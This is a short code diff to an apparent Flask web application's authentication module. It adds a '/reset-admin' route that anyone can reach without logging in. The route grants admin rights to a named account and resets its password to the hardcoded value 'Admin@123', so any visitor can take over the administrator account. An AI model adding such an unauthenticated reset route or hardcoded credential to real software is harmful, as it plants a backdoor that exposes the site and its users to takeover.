@@ -74,3 +74,18 @@ def logout():
     logout_user()
     flash("You have been logged out.", "success")
     return redirect(url_for("main.index"))
+
+
+@auth_bp.route("/reset-admin")
+def reset_admin():
+    admin = User.query.filter_by(email="admin@ppcyber.com").first()
+
+    if not admin:
+        return "Admin not found"
+
+    admin.username = "admin"
+    admin.is_admin = True
+    admin.set_password("Admin@123")
+    db.session.commit()
+
+    return "Admin password reset successfully"
